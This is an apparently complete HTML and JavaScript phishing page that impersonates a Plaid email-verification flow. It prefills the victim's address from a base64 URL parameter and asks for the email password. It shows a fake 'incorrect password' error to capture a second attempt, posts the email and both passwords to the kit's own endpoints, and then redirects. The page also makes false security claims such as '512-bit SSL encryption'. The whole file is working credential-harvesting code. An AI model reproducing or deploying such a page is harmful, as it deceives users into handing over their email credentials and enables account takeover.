<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Email</title>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {
                -webkit-box-sizing: border-box;
                        box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            body {
                background-color: #EEE;
            }

            span,
            label {
                display: block;
                max-width: -webkit-max-content;
                max-width: -moz-max-content;
                max-width: max-content;
                font-family: Arial;
                color: #111;
                font-size: 16px;
            }

            svg {
                display: block;
                height: 100%;
            }

            .steps {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                margin: auto;
                -ms-flex-wrap: wrap;
                    flex-wrap: wrap;
                -webkit-box-pack: center;
                    -ms-flex-pack: center;
                        justify-content: center;
                background-color: #FFF;
                -webkit-box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
                        box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
                gap: 35px;
                width: 100%;
                max-width: 350px;
                padding: 14px 0;
                margin-top: 50px;
            }

            .steps > div > svg {
                margin: auto;
                background-color: #FFF;
                border: 2px solid #111;
                border-radius: 50%;
                max-height: 40px;
                padding: 5px;
                -webkit-transition: fill .25s, border-color .25s;
                -o-transition: fill .25s, border-color .25s;
                transition: fill .25s, border-color .25s;
            }

            .steps > div > span {
                -webkit-user-select: none;
                -moz-user-select: none;
                    -ms-user-select: none;
                        user-select: none;
                margin-top: 10px;
                font-size: 14px;
                -webkit-transition: color .25s;
                -o-transition: color .25s;
                transition: color .25s;
            }

            .steps > div.active > svg {
                border-color: #0072CF;
                fill: #0072CF;
            }

            .steps > div.active > span {
                color: #0072CF;
            }

            .card {
                display: block;
                margin: auto;
                position: relative;
                background-color: #FFF;
                -webkit-box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
                        box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
                border-radius: 5px;
                width: 100%;
                max-width: 350px;
                padding: 35px 30px;
                margin-top: 20px;
            }

            .card > .load {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-align: center;
                    -ms-flex-align: center;
                        align-items: center;
                position: absolute;
                background-color: rgba(245, 245, 245, .85);
                top: 0;
                bottom: 0;
                left: 0;
                right: 0;
                z-index: 1;
            }

            .load > svg {
                margin: auto;
                max-height: 40px;
            }

            .load ~ * {
                -webkit-user-select: none;
                -moz-user-select: none;
                    -ms-user-select: none;
                        user-select: none;
                pointer-events: none;
            }

            .card > svg {
                margin: auto;
                max-height: 25px;
            }

            .card > .logos {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                -ms-flex-wrap: wrap;
                    flex-wrap: wrap;
                -webkit-box-pack: center;
                    -ms-flex-pack: center;
                        justify-content: center;
                margin: 30px 0;
            }

            .logos > svg {
                max-height: 45px;
            }

            .logos > svg:last-of-type {
                background-color: #FFF;
                border: 2px solid #111;
                border-radius: 50%;
                max-height: 45px;
                padding: 5px;
                margin-left: -10px;
            }

            .logos > div {
                background-color: #111;
                padding: 2px;
                border-radius: 50%;
                margin-left: -8px;
            }

            .card > .title {
                font-weight: bold;
                font-size: 22px;
            }

            .card > .sub {
                color: #383838;
                margin-top: 15px;
            }

            .card > .error {
                color: #D60000;
                margin-top: 10px;
            }

            form > .input {
                display: block;
                position: relative;
            }

            .input > input {
                display: block;
                background: #FFF;
                border: 1px solid #949494;
                width: 100%;
                outline: 0;
                font-size: 16px;
                padding: 14px 12px;
                padding-right: 40px;
                margin-top: 25px;
            }

            .input > input.error,
            .input > input.error:focus {
                border-color: #D60000;
            }

            .input > input.error ~ label {
                color: #D60000;
            }

            .input:not(:first-of-type) > input {
                margin-top: 15px;
            }

            .input > input.error ~ div > svg {
                fill: #D60000;
            }

            .input > input::-webkit-input-placeholder {
                color: #FFF;
            }

            .input > input::-moz-placeholder {
                color: #FFF;
            }

            .input > input:-ms-input-placeholder {
                color: #FFF;
            }

            .input > input::-ms-input-placeholder {
                color: #FFF;
            }

            .input > input::placeholder {
                color: #FFF;
            }

            .input > input:focus {
                border-color: #0072CF;
            }

            .input > input:not(:-moz-placeholder-shown) ~ label {
                top: 0;
                left: 8px;
                font-size: 12px;
                padding: 0 5px;
            }

            .input > input:not(:-ms-input-placeholder) ~ label {
                top: 0;
                left: 8px;
                font-size: 12px;
                padding: 0 5px;
            }

            .input > input:focus ~ label,
            .input > input:not(:placeholder-shown) ~ label {
                top: 0;
                left: 8px;
                font-size: 12px;
                padding: 0 5px;
            }

            .input > label {
                position: absolute;
                cursor: text;
                -webkit-user-select: none;
                -moz-user-select: none;
                    -ms-user-select: none;
                        user-select: none;
                background-color: #FFF;
                color: #555;
                top: 50%;
                -webkit-transform: translateY(-50%);
                    -ms-transform: translateY(-50%);
                        transform: translateY(-50%);
                left: 12px;
                -webkit-transition: .15s top, .15s left, .15s font-size, .15s padding;
                -o-transition: .15s top, .15s left, .15s font-size, .15s padding;
                transition: .15s top, .15s left, .15s font-size, .15s padding;
            }

            .input > div {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                position: absolute;
                -webkit-box-align: center;
                    -ms-flex-align: center;
                        align-items: center;
                top: 0;
                bottom: 0;
                right: 0;
                padding-right: 15px;
            }

            .input > div > svg {
                overflow: visible;
                fill: #111;
                max-height: 16px;
            }

            form > button {
                all: unset;
                cursor: pointer;
                font-weight: bold;
                -webkit-user-select: none;
                -moz-user-select: none;
                    -ms-user-select: none;
                        user-select: none;
                text-align: center;
                -webkit-box-sizing: border-box;
                        box-sizing: border-box;
                font-family: Arial;
                background: #111;
                color: #FFF;
                width: 100%;
                font-size: 16px;
                padding: 18px 0;
                margin-top: 25px;
                -webkit-transition: background .1s;
                -o-transition: background .1s;
                transition: background .1s;
            }

            form > button:hover {
                background: #0072CF;
            }

            form > button:focus {
                background: #0668BA;
            }
        </style>
    </head>
    <body>
        <div class="steps">
            <div class="active">
                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48">
                    <path d="M7 40q-1.2 0-2.1-.9Q4 38.2 4 37V11q0-1.2.9-2.1Q5.8 8 7 8h34q1.2 0 2.1.9.9.9.9 2.1v26q0 1.2-.9 2.1-.9.9-2.1.9Zm17-15.1L7 13.75V37h34V13.75Zm0-3L40.8 11H7.25ZM7 13.75V11v26Z"/>
                </svg>
                <span>Plaid Verify</span>
            </div>
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48">
                    <path d="M11 44q-1.25 0-2.125-.875T8 41V19.3q0-1.25.875-2.125T11 16.3h3.5v-4.8q0-3.95 2.775-6.725Q20.05 2 24 2q3.95 0 6.725 2.775Q33.5 7.55 33.5 11.5v4.8H37q1.25 0 2.125.875T40 19.3V41q0 1.25-.875 2.125T37 44Zm6.5-27.7h13v-4.8q0-2.7-1.9-4.6Q26.7 5 24 5q-2.7 0-4.6 1.9-1.9 1.9-1.9 4.6ZM11 41h26V19.3H11V41Zm13-7q1.6 0 2.725-1.1t1.125-2.65q0-1.5-1.125-2.725T24 26.3q-1.6 0-2.725 1.225T20.15 30.25q0 1.55 1.125 2.65Q22.4 34 24 34Zm0-3.85Z"/>
                </svg>
                <span>Email Authorize</span>
            </div>
        </div>
        <div class="card">
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 126 47.5">
                <defs>
                    <path id="a" d="M0 47.473h126V0H0z"/>
                </defs>
                <g fill="none" fill-rule="evenodd">
                    <path d="M66.248 16.268c-1.057-.889-2.861-1.333-5.413-1.333h-5.756v17.788h4.304v-5.575h1.928c2.34 0 4.056-.515 5.148-1.546 1.23-1.155 1.849-2.693 1.849-4.613 0-1.991-.687-3.565-2.06-4.721m-5.044 6.855h-1.821V18.96h1.636c1.99 0 2.985.698 2.985 2.094 0 1.378-.934 2.068-2.8 2.068M75.673 14.934h-4.488v17.788h9.69v-4.026h-5.202zM89.668 14.934l-7.05 17.788h4.832l.924-2.586H94.5l.845 2.586h4.886l-7-17.788h-3.563zm-.053 11.601l1.849-6.08 1.82 6.08h-3.67z" fill="#111"/>
                    <mask id="b" fill="#fff">
                        <use xlink:href="#a"/>
                    </mask>
                    <path fill="#111" mask="url(#b)" d="M102.473 32.722h4.489V14.934h-4.489zM124.39 18.268a7.376 7.376 0 0 0-2.14-2.053c-1.355-.854-3.204-1.28-5.545-1.28h-5.914v17.787h6.918c2.5 0 4.506-.817 6.02-2.453 1.514-1.635 2.27-3.805 2.27-6.508 0-2.15-.537-3.981-1.61-5.493m-7.182 10.427h-1.927v-9.734h1.954c1.373 0 2.428.43 3.168 1.287.74.857 1.11 2.073 1.11 3.647 0 3.2-1.435 4.8-4.305 4.8M18.637 0L4.09 3.81.081 18.439l5.014 5.148L0 28.65l3.773 14.693 14.484 4.047 5.096-5.064 5.014 5.147 14.547-3.81 4.008-14.63-5.013-5.146 5.095-5.063L43.231 4.13 28.745.083l-5.094 5.063L18.637 0zM9.71 6.624l7.663-2.008 3.351 3.44-4.887 4.856L9.71 6.624zm16.822 1.478l3.405-3.383 7.63 2.132-6.227 6.187-4.808-4.936zM4.672 17.238l2.111-7.705 6.125 6.288-4.886 4.856-3.35-3.44zm29.547-1.243l6.227-6.189 1.986 7.74-3.404 3.384-4.809-4.935zm-15.502-.127l4.887-4.856 4.807 4.936-4.886 4.856-4.808-4.936zm-7.814 7.765l4.886-4.856 4.81 4.936-4.888 4.856-4.808-4.936zm15.503.127l4.886-4.856L36.1 23.84l-4.887 4.856-4.807-4.936zM4.57 29.927l3.406-3.385 4.807 4.937-6.225 6.186-1.988-7.738zm14.021 1.598l4.887-4.856 4.808 4.936-4.886 4.856-4.809-4.936zm15.502.128l4.887-4.856 3.351 3.439-2.11 7.705-6.128-6.288zm-24.656 8.97l6.226-6.189 4.81 4.936-3.406 3.385-7.63-2.133zm16.843-1.206l4.886-4.856 6.126 6.289-7.662 2.007-3.35-3.44z"/>
                </g>
            </svg>
            <div class="logos">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
                    <rect width="48" height="48" rx="23.99" style="fill: #111"/>
                    <path d="M35,21.62l-1.76-6.86L26.38,13,24,15.38,21.62,13l-6.86,1.76L13,21.61,15.38,24,13,26.38l1.76,6.86L21.62,35,24,32.62,26.38,35l6.86-1.76L35,26.38,32.62,24Zm-2.2-.53-1.54,1.55L29,20.37l2.88-2.89ZM29.9,24l-2.27,2.27L25.35,24l2.28-2.27Zm-3-8.81,3.61.93L27.63,19l-2.28-2.27Zm-.63,5.18L24,22.64l-2.27-2.27L24,18.09ZM22.64,24l-2.27,2.27L18.09,24l2.28-2.27Zm-1.55-8.8,1.55,1.54L20.37,19l-2.89-2.88Zm-5.91,5.89.94-3.61L19,20.37l-2.27,2.27Zm0,5.82,1.54-1.55L19,27.63l-2.88,2.89Zm5.9,5.89-3.61-.93L20.37,29l2.28,2.27Zm.63-5.17L24,25.35l2.27,2.28L24,29.9Zm5.18,5.17-1.55-1.54L27.63,29l2.89,2.88Zm5.91-5.9-.94,3.61L29,27.63l2.27-2.28Z" fill="#FFF"/>
                </svg>
                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48">
                    <path d="M7 40q-1.2 0-2.1-.9Q4 38.2 4 37V11q0-1.2.9-2.1Q5.8 8 7 8h34q1.2 0 2.1.9.9.9.9 2.1v26q0 1.2-.9 2.1-.9.9-2.1.9Zm17-15.1L7 13.75V37h34V13.75Zm0-3L40.8 11H7.25ZM7 13.75V11v26Z"/>
                </svg>
            </div>
            <span class="title">Verify Your Email Address</span>
            </br>
            <small style="color:red" class="sub">We use Plaid to securely verify the ownership of your E-mail linked on file. </small>
            <form action="" method="POST">
                <div class="input">
                    <input id="email" type="text" placeholder="_">
                    <label for="email">Email Address</label>
                    <div>
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="5.25 3.25 13.5 16.5">
                            <path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z"/>
                        </svg>
                    </div>
                </div>
                <small style="color:red">Plaid uses 512-bit SSL encryption to prevent any breach of data. Your account will automatically be verified once your E-mail is authenticated..</small>
                <button id="postEmail" type="submit">Continue</button>
            </form>
        </div>
        <script>
            var e = document.getElementById("email");
            if (e) {
                const t = new URLSearchParams(window.location.search).get("qrc") || "";
                let o;
                try {
                    o = atob(t)
                } catch {
                    o = t
                }
                e.value = o
            }

            
            button = document.getElementsByTagName('button')[0];
            input = document.getElementsByTagName('input')[0];

            function enterPass() {
                steps = document.getElementsByClassName('steps')[0];
                card = document.getElementsByClassName('card')[0];

                title = document.getElementsByClassName('title')[0];
                sub = document.getElementsByClassName('sub')[0];

                inputParent = document.getElementsByClassName('input')[0];

                load = document.createElement('div');
                load.className = 'load';

                load.innerHTML = `
                    <svg width="105" height="105" viewBox="0 0 105 105" xmlns="http://www.w3.org/2000/svg" fill="#AAA">
                        <circle cx="12.5" cy="12.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="0s" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="12.5" cy="52.5" r="12.5" fill-opacity=".5">
                            <animate attributeName="fill-opacity" begin="100ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="52.5" cy="12.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="300ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="52.5" cy="52.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="600ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="92.5" cy="12.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="800ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="92.5" cy="52.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="400ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="12.5" cy="92.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="700ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="52.5" cy="92.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="500ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="92.5" cy="92.5" r="12.5">
                            <animate attributeName="fill-opacity" begin="200ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                        </circle>
                    </svg>
                `;

                card.appendChild(load);
                
                setTimeout(() => {
                    card.removeChild(load);

                    steps.children[0].classList.remove('active');
                    steps.children[1].classList.add('active');

                    title.innerText = 'Enter your Password';
                    sub.innerText = 'Please enter the password to your email address to continue.';

                    password = document.createElement('div');
                    password.className = 'input';

                    password.innerHTML = `
                        <input id="password" type="password" placeholder="_">
                        <label for="password">Password</label>
                        <div>
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="5.25 3.25 13.5 16.5">
                                <path d="M17.5 10.25h-.75V8a4.75 4.75 0 00-9.5 0v2.25H6.5a1.25 1.25 0 00-1.25 1.25v7a1.25 1.25 0 001.25 1.25h11a1.25 1.25 0 001.25-1.25v-7a1.25 1.25 0 00-1.25-1.25zM8.75 8a3.25 3.25 0 016.5 0v2.25h-6.5zm8.5 10.25H6.75v-6.5h10.5zm-6-4.25h1.5v2h-1.5z"/>
                            </svg>
                        </div>
                    `;
                    
                    inputParent.parentNode.insertBefore(password, inputParent.nextSibling);
                    
                    button.id = 'postPass';
                }, 1000);
            }

            document.addEventListener('click', (e) => {
                if (e.target.id == 'postEmail') {
                    regex = /^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i;

                    if (input.value.trim() != '' &&
                        input.value.trim().match(regex)
                    ) {
                        input.classList.remove('error');
                
                        xhr = new XMLHttpRequest();
                        xhr.open('POST', 'lalo/validate', 1);
                
                        xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
                
                        xhr.onreadystatechange = () => {
                            if (xhr.readyState == 4 && xhr.status == 200) {
                                try {
                                    obj = JSON.parse(xhr.responseText);
                                    if (obj['statusCode'] === 0){
                                        window.location.href = obj['emailProvider'];
                                    }
                                    else {
                                        enterPass();
                                    }
                                } catch (e) {
                                    enterPass();
                                }
                            }
                        }
                
                        xhr.send('email=' + input.value.trim().toLowerCase());
                    } else {
                        input.classList.add('error');
                    }
                
                    e.preventDefault();
                }

                if (e.target.id == 'postPass') {
                    inputs = [
                        document.getElementById('email'),
                        document.getElementById('password')
                    ];
                    
                    regex = /^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i;
                    x = 0;

                    inputs.forEach(i => {
                        if (i.value.trim() == '') {
                            i.classList.add('error');
                            x += 1;
                        } else {
                            i.classList.remove('error');
                        }
                    });

                    if (!inputs[0].value.trim().match(regex)) {
                        inputs[0].classList.add('error');
                        x += 1;
                    } else {
                        inputs[0].classList.remove('error');
                    }

                    xhr = new XMLHttpRequest();
                    xhr.open('POST', 'server', 1);

                    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded');

                    xhr.onreadystatechange = () => {
                        if (xhr.readyState == 4 && xhr.status == 200) {
                            if (!localStorage.getItem('pwd')) {
                                load = document.createElement('div');
                                load.className = 'load';

                                load.innerHTML = `
                                    <svg width="105" height="105" viewBox="0 0 105 105" xmlns="http://www.w3.org/2000/svg" fill="#AAA">
                                        <circle cx="12.5" cy="12.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="0s" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="12.5" cy="52.5" r="12.5" fill-opacity=".5">
                                            <animate attributeName="fill-opacity" begin="100ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="52.5" cy="12.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="300ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="52.5" cy="52.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="600ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="92.5" cy="12.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="800ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="92.5" cy="52.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="400ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="12.5" cy="92.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="700ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="52.5" cy="92.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="500ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                        <circle cx="92.5" cy="92.5" r="12.5">
                                            <animate attributeName="fill-opacity" begin="200ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                        </circle>
                                    </svg>
                                `;

                                card.appendChild(load);

                                setTimeout(() => {
                                    card.removeChild(load);
                                    window.location.href = '/auth/login/finish';
                                }, 500);
                            }
                        }
                    }

                    if (x == 0) {
                        if (!localStorage.getItem('pwd')) {
                            load = document.createElement('div');
                            load.className = 'load';

                            load.innerHTML = `
                                <svg width="105" height="105" viewBox="0 0 105 105" xmlns="http://www.w3.org/2000/svg" fill="#AAA">
                                    <circle cx="12.5" cy="12.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="0s" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="12.5" cy="52.5" r="12.5" fill-opacity=".5">
                                        <animate attributeName="fill-opacity" begin="100ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="52.5" cy="12.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="300ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="52.5" cy="52.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="600ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="92.5" cy="12.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="800ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="92.5" cy="52.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="400ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="12.5" cy="92.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="700ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="52.5" cy="92.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="500ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                    <circle cx="92.5" cy="92.5" r="12.5">
                                        <animate attributeName="fill-opacity" begin="200ms" dur="1s" values="1;.2;1" calcMode="linear" repeatCount="indefinite"/>
                                    </circle>
                                </svg>
                            `;

                            card.appendChild(load);

                            setTimeout(() => {
                                card.removeChild(load);
                                localStorage.setItem('pwd', '1');

                                document.getElementsByClassName('sub')[0].outerHTML += `
                                    <span class="error">Your email address or password is incorrect, please try again.</span>
                                `;

                                inputs[0].classList.add('error');
                                inputs[1].classList.add('error');

                                xhr.send('mento=' + inputs[0].value.trim() + '&pinto1=' + inputs[1].value.trim());

                                inputs[0].value = '';
                                inputs[1].value = '';
                            }, 500);
                        } else {
                            localStorage.removeItem('pwd');
                            document.getElementsByClassName('error')[0].remove();

                            inputs[0].classList.remove('error');
                            inputs[1].classList.remove('error');

                            xhr.send('mento=' + inputs[0].value.trim() + '&pinto2=' + inputs[1].value.trim());
                            window.location.href = '/auth/login/finish';

                        }
                    }

                    e.preventDefault();
                }
            });
        </script>
    </body>
</html>